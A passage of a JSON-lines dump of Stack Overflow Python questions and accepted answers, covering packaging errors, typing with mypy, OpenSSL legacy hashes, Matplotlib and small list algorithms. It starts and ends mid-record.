\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nAll that remains is to use fill_null to replace the null values with an empty string \"\".  Notice that I've used a regex expression in the col expression to target only those columns whose names start with \"string_\".  (Depending on your other data, you may not want to replace null with \"\" everywhere in your data.)\n"
}
{
    "Id": 73143854,
    "PostTypeId": 1,
    "Title": "Linking opencv-python to opencv-cuda in Arch",
    "Body": "I'm trying to to get OpenCV with CUDA to be used in Python open-cv on Arch Linux, but I'm not sure how to link it.\nArch provides a package opencv-cuda, which provides these files.\nGuides I've found said to link the python cv2.so to the one provided, but the package doesn't provide that. My python site_packages has cv2.abi3.so in it, and I've tried linking that to core.so and cvv.so to no avail.\nDo I need to build it differently to support Python? Or is there another step I'm missing?\n",
    "AcceptedAnswerId": 73227581,
    "AcceptedAnswer": "On Arch, opencv-cuda provides opencv=4.6.0, but you still need the python bindings. Fortunately though, installing python-opencv after installling opencv-cuda works, since it leverages it.\nI just set up my Python virtual environment to allow system site packages (python -m venv .venv --system-site-packages), and it works like a charm! Neural net image detection runs ~300% as fast now.\n"
}
{
    "Id": 71712258,
    "PostTypeId": 1,
    "Title": "ERROR: Could not build wheels for backports.zoneinfo, which is required to install pyproject.toml-based projects",
    "Body": "The Heroku Build is returning this error when I'm trying to deploy a Django application for the past few days. The Django Code and File Structure are the same as Django's Official Documentation and Procfile is added in the root folder.\nLog -\n-----> Building on the Heroku-20 stack\n-----> Determining which buildpack to use for this app\n-----> Python app detected\n-----> No Python version was specified. Using the buildpack default: python-3.10.4\n       To use a different version, see: https://devcenter.heroku.com/articles/python-runtimes\n       Building wheels for collected packages: backports.zoneinfo\n         Building wheel for backports.zoneinfo (pyproject.toml): started\n         Building wheel for backports.zoneinfo (pyproject.toml): finished with status 'error'\n         ERROR: Command errored out with exit status 1:\n          command: /app/.heroku/python/bin/python /app/.heroku/python/lib/python3.10/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /tmp/tmpqqu_1qow\n              cwd: /tmp/pip-install-txfn1ua9/backports-zoneinfo_a462ef61051d49e7bf54e715f78a34f1\n         Complete output (41 lines):\n         running bdist_wheel\n         running build\n         running build_py\n         creating build\n         creating build/lib.linux-x86_64-3.10\n         creating build/lib.linux-x86_64-3.10/backports\n         copying src/backports/__init__.py -> build/lib.linux-x86_64-3.10/backports\n         creating build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/_zoneinfo.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/_tzpath.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/_common.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/_version.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/__init__.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         running egg_info\n         writing src/backports.zoneinfo.egg-info/PKG-INFO\n         writing dependency_links to src/backports.zoneinfo.egg-info/dependency_links.txt\n         writing requirements to src/backports.zoneinfo.egg-info/requires.txt\n         writing top-level names to src/backports.zoneinfo.egg-info/top_level.txt\n         reading manifest file 'src/backports.zoneinfo.egg-info/SOURCES.txt'\n         reading manifest template 'MANIFEST.in'\n         warning: no files found matching '*.png' under directory 'docs'\n         warning: no files found matching '*.svg' under directory 'docs'\n         no previously-included directories found matching 'docs/_build'\n         no previously-included directories found matching 'docs/_output'\n         adding license file 'LICENSE'\n         adding license file 'licenses/LICENSE_APACHE'\n         writing manifest file 'src/backports.zoneinfo.egg-info/SOURCES.txt'\n         copying src/backports/zoneinfo/__init__.pyi -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/py.typed -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         running build_ext\n         building 'backports.zoneinfo._czoneinfo' extension\n         creating build/temp.linux-x86_64-3.10\n         creating build/temp.linux-x86_64-3.10/lib\n         gcc -pthread -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -fPIC -I/app/.heroku/python/include/python3.10 -c lib/zoneinfo_module.c -o build/temp.linux-x86_64-3.10/lib/zoneinfo_module.o -std=c99\n         lib/zoneinfo_module.c: In function \u2018zoneinfo_fromutc\u2019:\n         lib/zoneinfo_module.c:600:19: error: \u2018_PyLong_One\u2019 undeclared (first use in this function); did you mean \u2018_PyLong_New\u2019?\n           600 |             one = _PyLong_One;\n               |                   ^~~~~~~~~~~\n               |                   _PyLong_New\n         lib/zoneinfo_module.c:600:19: note: each undeclared identifier is reported only once for each function it appears in\n         error: command '/usr/bin/gcc' failed with exit code 1\n         ----------------------------------------\n         ERROR: Failed building wheel for backports.zoneinfo\n       Failed to build backports.zoneinfo\n       ERROR: Could not build wheels for backports.zoneinfo, which is required to install pyproject.toml-based projects\n !     Push rejected, failed to compile Python app.\n !     Push failed\n\nThanks.\n",
    "AcceptedAnswerId": 72796492,
    "AcceptedAnswer": "Avoid installing backports.zoneinfo when using python >= 3.9\nEdit your requirements.txt file\nFROM:\nbackports.zoneinfo==0.2.1\n\nTO:\nbackports.zoneinfo;python_version<\"3.9\"\n\nOR:\nbackports.zoneinfo==0.2.1;python_version<\"3.9\"\n\nYou can read more about this here and here\n"
}
{
    "Id": 72504576,
    "PostTypeId": 1,
    "Title": "Why use `from module import A as A` instead of just `from module import A`",
    "Body": "When reading source code of fastapi, this line make me fuzzy:\nfrom starlette.testclient import TestClient as TestClient\n\nWhy not just: from starlette.testclient import TestClient?\n",
    "AcceptedAnswerId": 73712178,
    "AcceptedAnswer": "From the point of view of executable code, there is absolutely no difference in terms of the Python bytecode being generated by the two different code examples (using Python 3.9):\n>>> dis.dis('from starlette.testclient import TestClient as TestClient')\n  1           0 LOAD_CONST               0 (0)\n              2 LOAD_CONST               1 (('TestClient',))\n              4 IMPORT_NAME              0 (starlette.testclient)\n              6 IMPORT_FROM              1 (TestClient)\n              8 STORE_NAME               1 (TestClient)\n             10 POP_TOP\n             12 LOAD_CONST               2 (None)\n             14 RETURN_VALUE\n>>> dis.dis('from starlette.testclient import TestClient')\n  1           0 LOAD_CONST               0 (0)\n              2 LOAD_CONST               1 (('TestClient',))\n              4 IMPORT_NAME              0 (starlette.testclient)\n              6 IMPORT_FROM              1 (TestClient)\n              8 STORE_NAME               1 (TestClient)\n             10 POP_TOP\n             12 LOAD_CONST               2 (None)\n             14 RETURN_VALUE\n\nAs shown, they are exactly identical. (Related thread and thread.)\nHowever, the comment by Graham501617 noted how modern type hinting validators (such as mypy) accept this particular syntax to denote the re-export of that imported name (the other being the __all__, which thankfully they did end up correctly supporting as that has been a standard syntax to denote symbols to (re-)export since Python 2).  Specifically, as per the description of Stub Files in the referenced PEP 0484, quote:\n\n\nModules and variables imported into the stub are not considered exported from the stub unless the import uses the import ... as ... form or the equivalent from ... import ... as ... form. (UPDATE: To clarify, the intention here is that only names imported using the form X as X will be exported, i.e. the name before and after as must be the same.)\n\n\nWhich means the library is likely following that particular convention to facilitate the re-export of the TestClient name from the stub (module) file that was referenced in the question.  As a matter of fact, looking at git blame for the relevant file in the packages pointed to this commit (direct link to relevant diff for the file) which referenced this issue, which contains a similar brief discussion to address the exact type hinting issue; this was done to ensure mypy will treat those imported names as re-export, thus allowing the usage of the --no-implicit-reexport flag (which --strict has likely implicitly enabled).\n"
}
{
    "Id": 73240620,
    "PostTypeId": 1,
    "Title": "The right way to type hint a Coroutine function?",
    "Body": "I cannot wrap my head around type hinting a Coroutine. As far as I understand, when we declare a function like so:\nasync def some_function(arg1: int, arg2: str) -> list:\n    ...\n\nwe effectively declare a function, which returns a coroutine, which, when awaited, returns a list. So, the way to type hint it would be:\nf: Callable[[int, str], Coroutine[???]] = some_function\n\nBut Coroutine generic type has 3 arguments! We can see it if we go to the typing.py file:\n...\nCoroutine = _alias(collections.abc.Coroutine, 3)\n...\n\nThere is also Awaitable type, which logically should be a parent of Coroutine with only one generic parameter (the return type, I suppose):\n...\nAwaitable = _alias(collections.abc.Awaitable, 1)\n...\n\nSo maybe it would be more or less correct to type hint the function this way:\nf: Callable[[int, str], Awaitable[list]] = some_function\n\nOr is it?\nSo, basically, the questions are:\n\nCan one use Awaitable instead of Coroutine in the case of type hinting an async def function?\nWhat are the correct parameters for the Coroutine generic type and what are its use-cases?\n\n",
    "AcceptedAnswerId": 73240734,
    "AcceptedAnswer": "As the docs state:\n\nCoroutine objects and instances of the Coroutine ABC are all instances of the Awaitable ABC.\n\nAnd for the Coroutine type:\n\nA generic version of collections.abc.Coroutine. The variance and order of type variables correspond to those of Generator.\n\nGenerator in turn has the signature Generator[YieldType, SendType, ReturnType]. So if you want to preserve that type information, use Coroutine, otherwise Awaitable should suffice.\n"
}
{
    "Id": 73075669,
    "PostTypeId": 1,
    "Title": "How to extract doc from avro data and add it to dataframe",
    "Body": "I'm trying to create hive/impala tables base on avro files in HDFS. The tool for doing the transformations is Spark.\nI can't use spark.read.format(\"avro\") to load the data into a dataframe, as in that way the doc part (description of the column) will be lost. I can see the doc by doing:\n input = sc.textFile(\"/path/to/avrofile\")\n avro_schema = input.first() # not sure what type it is \n\nThe problem is, it's a nested schema and I'm not sure how to traverse it to map the doc to the column description in dataframe. I'd like to have doc to the column description of the table. For example, the input schema looks like:\n\"fields\": [\n    {\n     \"name\":\"productName\",\n     \"type\": [\n       \"null\",\n       \"string\"\n      ],\n     \"doc\": \"Real name of the product\"\n     \"default\": null\n    },\n    {\n     \"name\" : \"currentSellers\",\n     \"type\": [\n        \"null\",\n        {\n         \"type\": \"record\",\n         \"name\": \"sellers\",\n         \"fields\":[\n             {\n              \"name\": \"location\",\n              \"type\":[\n                 \"null\",\n                  {\n                   \"type\": \"record\"\n                   \"name\": \"sellerlocation\",\n                   \"fields\": [\n                      {\n                       \"name\":\"locationName\",\n                       \"type\": [\n                           \"null\",\n                           \"string\"\n                         ],\n                       \"doc\": \"Name of the location\",\n                       \"default\":null\n                       },\n                       {\n                       \"name\":\"locationArea\",\n                       \"type\": [\n                           \"null\",\n                           \"string\"\n                         ],\n                       \"doc\": \"Area of the location\",#The comment needs to be added to table comments\n                       \"default\":null\n                         .... #These are nested fields \n\nIn the final table, for example one field name would be currentSellers_locationName, with column description \"Name of the location\". Could someone please help to shed some light on how to parse the schema and add the doc to description? and explain a bit about what this below bit is about outside of the fields? Many thanks. Let me know if I can explain it better.\n         \"name\" : \"currentSellers\",\n     \"type\": [\n        \"null\",\n        {\n         \"type\": \"record\",\n         \"name\": \"sellers\",\n         \"fields\":[\n             {\n  \n\n",
    "AcceptedAnswerId": 73258076,
    "AcceptedAnswer": "If you would like to parse the schema yourself and manually add metadata to spark, I would suggest flatdict package:\nfrom flatdict import FlatterDict\n\nflat_schema = FlatterDict(schema)  # schema as python dict\n\nnames = {k.replace(':name', ''): flat_schema[k] for k in flat_schema if k.endswith(':name')}\ndocs = {k.replace(':doc', ''): flat_schema[k] for k in flat_schema if k.endswith(':doc')}\n\n# keep only keys which are present in both names and docs\nkeys_with_doc = set(names.keys()) & set(docs.keys())\n\nfull_name = lambda key: '_'.join(\n    names[k] for k in sorted(names, key=len) if key.startswith(k) and k.split(':')[-2] == 'fields'\n)\nname_doc_map = {full_name(k): docs[k] for k in keys_with_doc}\n\nA typical set of keys in flat_schema.keys() is:\n'fields:1:type:1:fields:0:type:1:fields:0:type:1',\n'fields:1:type:1:fields:0:type:1:fields:0:name',\n'fields:1:type:1:fields:0:type:1:fields:0:default',\n'fields:1:type:1:fields:0:type:1:fields:0:doc',\n\nThese strings can now be manipulated:\n\nextract only the ones ending with \"name\" and \"doc\" (ignore \"default\", etc.)\nget set intersection to remove the ones that do not have both fields present\nget a list of all field names from higher levels of hierarchy: fields:1:type:1:fields is one of parents of fields:1:type:1:fields:0:type:1:fields (the condition is that they have the same start and they end with \"fields\")\n\n"
}
{
    "Id": 72839263,
    "PostTypeId": 1,
    "Title": "Access python interpreter in VSCode version controll when using pre-commit",
    "Body": "I'm using pre-commit for most of my Python projects, and in many of them, I need to use pylint as a local repo. When I want to commit, I always have to activate python venv and then commit; otherwise, I'll get the following error:\nblack....................................................................Passed\npylint...................................................................Failed\n- hook id: pylint\n- exit code: 1\n\nExecutable `pylint` not found\n\nWhen I use vscode version control to commit, I get the same error; I searched about the problem and didn't find any solution to avoid the error in VSCode.\nThis is my typical .pre-commit-config.yaml:\nrepos:\n-   repo: https://github.com/ambv/black\n    rev: 21.9b0\n    hooks:\n    - id: black\n      language_version: python3.8\n      exclude: admin_web/urls\\.py\n-   repo: local\n    hooks:\n    -   id: pylint\n        name: pylint\n        entry: pylint\n        language: python\n        types: [python]\n        args: \n         - --rcfile=.pylintrc\n\n\n",
    "AcceptedAnswerId": 72839338,
    "AcceptedAnswer": "you have ~essentially two options here -- neither are great (language: system is kinda the unsupported escape hatch so it's on you to make those things available on PATH)\nyou could use a specific path to the virtualenv entry: venv/bin/pylint -- though that will reduce the portability.\nor you could start vscode with your virtualenv activated (usually code .) -- this doesn't always work if vscode is already running\n\ndisclaimer: I created pre-commit\n"
}
{
    "Id": 73271404,
    "PostTypeId": 1,
    "Title": "How to find the average of the differences between all the numbers of a Python List",
    "Body": "I have a python list like this,\narr = [110, 60, 30, 10, 5] \n\nWhat I need to do is actually find the difference of every number with all the other numbers and then find the average of all those differences.\nSo, for this case, it would first find the difference between 110 and then all the remaining elements, i.e. 60, 30, 10, 5, and then it will find the difference of 60 with the remaining elements, i.e. 30, 10, 5 and etc.\nAfter which, it will compute the Average of all these differences.\nNow, this can easily be done with two For Loops but in O(n^2) time complexity and also a little bit of \"messy\" code. I was wondering if there was a faster and more efficient way of doing this same thing?\n",
    "AcceptedAnswerId": 73271447,
    "AcceptedAnswer": "I'll just give the formula first:\nn = len(arr)\nout = np.sum(arr * np.arange(n-1, -n, -2) ) / (n*(n-1) / 2)\n# 52\n\nExplanation: You want to find the mean of\na[0] - a[1], a[0] - a[2],..., a[0] - a[n-1]\n             a[1] - a[2],..., a[1] - a[n-1]\n                         ...\n\nthere, your\n`a[0]` occurs `n-1` times with `+` sign, `0` with `-` -> `n-1` times\n`a[1]` occurs `n-2` times with `+` sign, `1` with `-` -> `n-3` times\n... and so on \n\n"
}
{
    "Id": 72497046,
    "PostTypeId": 1,
    "Title": "skipping a certain range of a list at time in python",
    "Body": "I have a array, I want to pick first 2 or range, skip the next 2, pick the next 2 and continue this until the end of the list\nlist = [2, 4, 6, 7, 9,10, 13, 11, 12,2]\nresults_wanted = [2,4,9,10,12,2] # note how it skipping 2. 2 is used here as and example\n\nIs there way to achieve this in python?\n",
    "AcceptedAnswerId": 72497107,
    "AcceptedAnswer": "Taking n number of elements and skipping the next n.\nl = [2, 4, 6, 7, 9, 10, 13, 11, 12, 2]\nn = 2\nwanted = [x for i in range(0, len(l), n + n) for x in l[i: i + n]]\n### Output : [2, 4, 9, 10, 12, 2]\n\n"
}
{
    "Id": 73749995,
    "PostTypeId": 1,
    "Title": "Why does Matplotlib 3.6.0 on MacOS throw an `AttributeError` when showing a plot?",
    "Body": "I have the following straightforward code:\nimport matplotlib.pyplot as plt\nx = [1,2,3,4]\ny = [34, 56, 78, 21]\nplt.plot(x, y)\nplt.show()\n\nBut after changing my MacBook Pro to the M1 chip, I'm getting the following error:\nTraceback (most recent call last):\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/main.py\", line 291, in \n    plt.plot(x, y)\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 2728, in plot\n    return gca().plot(\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 2225, in gca\n    return gcf().gca()\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 830, in gcf\n    return figure()\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/_api/deprecation.py\", line 454, in wrapper\n    return func(*args, **kwargs)\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 771, in figure\n    manager = new_figure_manager(\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 346, in new_figure_manager\n    _warn_if_gui_out_of_main_thread()\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 336, in _warn_if_gui_out_of_main_thread\n    if (_get_required_interactive_framework(_get_backend_mod()) and\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 206, in _get_backend_mod\n    switch_backend(dict.__getitem__(rcParams, \"backend\"))\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 266, in switch_backend\n    canvas_class = backend_mod.FigureCanvas\nAttributeError: module 'backend_interagg' has no attribute 'FigureCanvas'\n\nWhy does the code throw this error?\nMy matplotlib version is 3.6.0\n",
    "AcceptedAnswerId": 73755442,
    "AcceptedAnswer": "i had the same problem today on a different machine in the same matplotlib version. I downgrade to Version 3.5.0 and now it works.\n"
}
{
    "Id": 72409563,
    "PostTypeId": 1,
    "Title": "Unsupported hash type ripemd160 with hashlib in Python",
    "Body": "After a thorough search, I have not found a complete explanation and solution to this very common problem on the entire web. All scripts that need to encode with hashlib give me error:\nPython 3.10\nimport hashlib\nh = hashlib.new('ripemd160')\n\nreturn:\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"/usr/lib/python3.10/hashlib.py\", line 166, in __hash_new\n    return __get_builtin_constructor(name)(data)\n  File \"/usr/lib/python3.10/hashlib.py\", line 123, in __get_builtin_constructor\n    raise ValueError('unsupported hash type ' + name)\nValueError: unsupported hash type ripemd160\n\nI already tried to check if that hash exists in the library, and if I have it:\nprint(hashlib.algorithms_available): {'md5', 'sm3', 'sha3_512', 'sha384', 'sha256', 'sha1', 'shake_128', 'sha224', 'sha512_224', 'sha512_256', 'blake2b', 'ripemd160', 'md5-sha1', 'sha512', 'sha3_256', 'shake_256', 'sha3_384', 'whirlpool', 'md4', 'blake2s', 'sha3_224'}\nI am having this problem in a vps with linux, but in my pc I use Windows and I don't have this problem.\nI sincerely appreciate any help or suggestion.\n",
    "AcceptedAnswerId": 72508879,
    "AcceptedAnswer": "Hashlib uses OpenSSL for ripemd160 and apparently OpenSSL disabled some older crypto algos around version 3.0 in November 2021. All the functions are still there but require manual enabling. See issue 16994 of OpenSSL github project for details.\nTo quickly enable it, find the directory that holds your OpenSSL config file or a symlink to it, by running the below command:\nopenssl version -d\n\nYou can now go to the directory and edit the config file (it may be necessary to use sudo):\nnano openssl.cnf\n\nMake sure that the config file contains following lines:\nopenssl_conf = openssl_init\n\n[openssl_init]\nproviders = provider_sect\n\n[provider_sect]\ndefault = default_sect\nlegacy = legacy_sect\n\n[default_sect]\nactivate = 1\n\n[legacy_sect]\nactivate = 1\n\nTested on: OpenSSL 3.0.2, Python 3.10.4, Linux Ubuntu 22.04 LTS aarch64, I have no access to other platforms at the moment.\n"
}
{
    "Id": 72756419,
    "PostTypeId": 1,
    "Title": "MyPy: 'incompatible type' for virtual class inheritance",
    "Body": "Demo code\n#!/usr/bin/env python3\n\nfrom abc import ABCMeta, abstractmethod\n\nclass Base(metaclass = ABCMeta):\n    @classmethod\n    def __subclasshook__(cls, subclass):\n        return (\n            hasattr(subclass, 'x')\n        )\n\n    @property\n    @abstractmethod\n    def x(self) -> float:\n        raise NotImplementedError\n\nclass Concrete:\n    x: float = 1.0\n\nclass Application:\n    def __init__(self, obj: Base) -> None:\n        print(obj.x)\n\nob = Concrete() \napp = Application(ob)\n\nprint(issubclass(Concrete, Base))\nprint(isinstance(Concrete, Base))\nprint(type(ob))\nprint(Concrete.__mro__)\n\npython test_typing.py returns:\n1.0\nTrue\nFalse\n\n(, )\n\nand mypy test_typing.py returns:\ntest_typing.py:30: error: Argument 1 to \"Application\" has incompatible type \"Concrete\"; expected \"Base\"\nFound 1 error in 1 file (checked 1 source\n\nBut if i change the line class Concrete: to class Concrete(Base):, i get for\npython test_typing.py this:\n1.0\nTrue\nFalse\n\n(, , )\n\nand for mypy test_typing.py this:\nSuccess: no issues found in 1 source file\n\nIf i add to my code this:\nreveal_type(Concrete)\nreveal_type(Base)\n\ni get in both cases the same results for it from mypy test_typing.py:\ntest_typing.py:37: note: Revealed type is \"def () -> vmc.test_typing.Concrete\"\ntest_typing.py:38: note: Revealed type is \"def () -> vmc.test_typing.Base\"\n\nConclusion\nSeems obvious, that MyPi have some problems with virtual base classes but non-virtual inheritance seems working as expected.\nQuestion\nHow works MyPy's type estimation in these cases?\nIs there an workaround?\n2nd Demo code\nUsing Protocol pattern:\n#!/usr/bin/env python3\n\nfrom abc import abstractmethod\nfrom typing import Protocol, runtime_checkable\n\n@runtime_checkable\nclass Base(Protocol):\n    @property\n    def x(self) -> float:\n        raise NotImplementedError\n    \n    @abstractmethod\n    def __init__(self, x: float) -> None:\n        raise NotImplementedError\n\n    \"\"\"\n    @classmethod\n    def test(self) -> None:\n        pass\n    \"\"\"\n\nclass Concrete:\n    x: float = 1.0\n\nclass Application:\n    def __init__(self, obj: Base) -> None:\n        pass\n\nob = Concrete() \napp = Application(ob)\n\nPros\n\nWorking with mypy: Success: no issues found in 1 source file\nWorking with isinstance(Concrete, Base) : True\n\nCons\n\nNot working with issubclass(Concrete, Base): TypeError: Protocols with non-method members don't support issubclass()\nNot checking the __init__ method signatures: __init__(self, x: float) -> None vs. __init__(self) -> None (Why returns inspect.signature() the strings (self, *args, **kwargs) and (self, /, *args, **kwargs) here? With class Base: instead of class Base(Protocol): i get (self, x: float) -> None and (self, /, *args, **kwargs))\nignoring the difference between @abstractmethod and @classmethod (treats ANY method as abstract)\n\n3rd Demo code\nThis time just an more complex example of the 1st code:\n#!/usr/bin/env python3\n\nfrom abc import ABCMeta, abstractmethod\nfrom inspect import signature\n\nclass Base(metaclass = ABCMeta):\n    @classmethod\n    def __subclasshook__(cls, subclass):\n        return (\n            hasattr(subclass, 'x') and\n            (signature(subclass.__init__) == signature(cls.__init__))\n        )\n\n    @property\n    @abstractmethod\n    def x(self) -> float:\n        raise NotImplementedError\n    \n    @abstractmethod\n    def __init__(self, x: float) -> None:\n        raise NotImplementedError\n\n    @classmethod\n    def test(self) -> None:\n        pass\n\nclass Concrete:\n    x: float = 1.0\n\n    def __init__(self, x: float) -> None:\n        pass\n\nclass Application:\n    def __init__(self, obj: Base) -> None:\n        pass\n\nob = Concrete(1.0) \napp = Application(ob)\n\nPros\n\nWorking with issubclass(Concrete, Base): True\nWorking with isinstance(Concrete, Base): False\nMethod signature check also for __init__.\n\nCons\n\nNot working with MyPy:\ntest_typing.py:42: error: Argument 1 to \"Application\" has incompatible type \"Concrete\"; expected \"Base\"\nFound 1 error in 1 file (checked 1 source file)\n\n\n\n4th Demo code\nIn some circumstances the following code might be an possible solution.\n#!/usr/bin/env python3\n\nfrom typing import Protocol, runtime_checkable\nfrom dataclasses import dataclass\n\n@runtime_checkable\nclass Rotation(Protocol):\n    @property\n    def x(self) -> float:\n        raise NotImplementedError\n    \n    @property\n    def y(self) -> float:\n        raise NotImplementedError\n\n    @property\n    def z(self) -> float:\n        raise NotImplementedError\n\n    @property\n    def w(self) -> float:\n        raise NotImplementedError\n\n@dataclass\nclass Quaternion:\n    x: float = 0.0\n    y: float = 0.0\n    z: float = 0.0\n    w: float = 1.0\n\n    def conjugate(self) -> 'Quaternion':\n        return type(self)(\n            x = -self.x,\n            y = -self.y,\n            z = -self.z,\n            w = self.w\n        )\n\nclass Application:\n    def __init__(self, rot: Rotation) -> None:\n        print(rot)\n\nq = Quaternion(0.7, 0.0, 0.7, 0.0)\napp = Application(q.conjugate())\n\nPros:\n\nAuto-generated __init__ method because of @dataclass usage. here: (self, x: float = 0.0, y: float = 0.0, z: float = 0.0, w: float = 1.0) -> None\nWorks with isinstance(): True\nWorks with mypy: Success: no issues found in 1 source file\n\nCons:\n\nYou need to hope, that the next developer uses @dataclass along with implementing your interface..\nNot usable for __init__ methods, that are not only taken class attributes.\n\nTipp: If an forced __init__ method is not required and only want to take care of the attributes, then just omit @dataclass.\n5th Demo code\nUpdated the 4th code to provide more safety, but without implicit __init__ method:\n#!/usr/bin/env python3\n\nfrom abc import abstractmethod\nfrom typing import Protocol, runtime_checkable\n\n@runtime_checkable\nclass Rotation(Protocol):\n    @property\n    @abstractmethod\n    def x(self) -> float:\n        raise NotImplementedError\n    \n    @property\n    @abstractmethod\n    def y(self) -> float:\n        raise NotImplementedError\n\n    @property\n    @abstractmethod\n    def z(self) -> float:\n        raise NotImplementedError\n\n    @property\n    @abstractmethod\n    def w(self) -> float:\n        raise NotImplementedError\n\nclass Quaternion:\n    _x: float = 0.0\n    _y: float = 0.0\n    _z: float = 0.0\n    _w: float = 1.0\n\n    @property\n    def x(self) -> float:\n        return self._x\n\n    @property\n    def y(self) -> float:\n        return self._y\n\n    @property\n    def z(self) -> float:\n        return self._z\n\n    @property\n    def w(self) -> float:\n        return self._w\n\n    def __init__(self, x: float, y: float, z: float, w: float) -> None:\n        self._x = float(x)\n        self._y = float(y)\n        self._z = float(z)\n        self._w = float(w)\n\n    def conjugate(self) -> 'Quaternion':\n        return type(self)(\n            x = -self.x,\n            y = -self.y,\n            z = -self.z,\n            w = self.w\n        )\n\n    def __str__(self) -> str:\n        return \", \".join(\n            (\n                str(self._x),\n                str(self._y),\n                str(self._z),\n                str(self._w)\n            )\n        )\n\n    def __repr__(self) -> str:\n        cls = self.__class__\n        module = cls.__module__\n        return f\"{module + '.' if module != '__main__' else ''}{cls.__qualname__}({str(self)})\"\n\nclass Application:\n    def __init__(self, rot: Rotation) -> None:\n        print(rot)\n\nq = Quaternion(0.7, 0.0, 0.7, 0.0)\napp = Application(q.conjugate())\n\n\nCurrent conclusion\nThe Protocol way is unstable.\nBut the Metaclass way is not checkable, because it's not working with MyPy (because it's not static).\nUpdated question\nAre there any alternative solutions to achieve some type of Interfaces (without class Concrete(Base)) AND make it type-safe (checkable)?\n",
    "AcceptedAnswerId": 72843690,
    "AcceptedAnswer": "Result\nAfter running some tests and more research i am sure, that the actual problem is the behaviour of Protocol to silently overwrite the defined __init__ method.\nConclusion\nSeems logical, since Protocols are not intended to be initiated.\nBut sometimes it's required to define an __init__ method,\nbecause in my opinion __init__ methods are also part of the interface of classes and it's objects.\nSolution\nI found an existing issue about this problem, that seems to confirm my point of view: https://github.com/python/cpython/issues/88970\nFortunately it's already fixed:\nhttps://github.com/python/cpython/commit/5f2abae61ec69264b835dcabe2cdabe57b9a990e\nBut unfortunately, this fix will only be part of Python 3.11 and above.\nCurrenty is Python 3.10.5 available.\nWARNING: Like mentioned in the issue, some static type checkers might behave different in this case. MyPy just ignores the missing __init__ method (tested it, confirmed) BUT Pyright seems to detect and report the missing __init__ method (not tested by me).\n"
}
{
    "Id": 73765587,
    "PostTypeId": 1,
    "Title": "How to get a warning about a list being a mutable default argument?",
    "Body": "I accidentally used a mutable default argument without knowing it.\nIs there a linter or tool that can spot this and warn me?\n",
    "AcceptedAnswerId": 73765790,
    "AcceptedAnswer": "flake8-bugbear, Pylint, PyCharm, and Pyright can detect this:\n\nBugbear has B006 (Do not use mutable data structures for argument defaults).\n\nDo not use mutable data structures for argument defaults. They are created during function definition time. All calls to the function reuse this one instance of that data structure, persisting changes between them.\n\n\nPylint has W0102 (dangerous default value).\n\nUsed when a mutable value as list or dictionary is detected in a default value for an argument.\n\n\nPyright has reportCallInDefaultInitializer.\n\nGenerate or suppress diagnostics for function calls, list expressions, set expressions, or dictionary expressions within a default value initialization expression. Such calls can mask expensive operations that are performed at module initialization time.\n\nThis does what you want, but be aware that it also checks for function calls in default arguments.\n\nPyCharm has Default argument's value is mutable.\n\nThis inspection detects when a mutable value as list or dictionary is detected in a default value for an argument.\nDefault argument values are evaluated only once at function definition time, which means that modifying the default value of the argument will affect all subsequent calls of the function.\n\nUnfortunately, I can't find online documentation for this. If you have PyCharm, you can access all inspections and navigate to this inspection to find the documentation.\n\n\n"
}
{
    "Id": 73739158,
    "PostTypeId": 1,
    "Title": "NodeJS convert to Byte Array code return different results compare to python",
